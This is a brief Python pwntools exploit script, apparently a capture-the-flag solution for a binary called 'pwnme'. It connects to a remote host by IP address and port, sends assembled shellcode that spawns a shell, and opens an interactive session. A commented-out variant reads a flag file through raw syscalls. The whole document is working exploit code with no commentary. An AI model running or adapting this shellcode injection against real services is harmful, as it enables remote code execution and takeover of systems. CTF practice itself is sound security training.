from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])


# io=process("./pwnme")
io=remote("101.43.190.199",28024)
elf=ELF("./pwnme")

io.recvuntil(b">>>")
payload=asm('mov eax,0x0')+asm(shellcraft.sh())
# payload=asm('mov eax,0x0')+asm(shellcraft.open("./flag"))+asm(shellcraft.read(3,0x404100,0x40))+asm(shellcraft.write(1,0x404100,0x40))
# gdb.attach(io)
# pause()

io.sendline(payload)

io.interactive()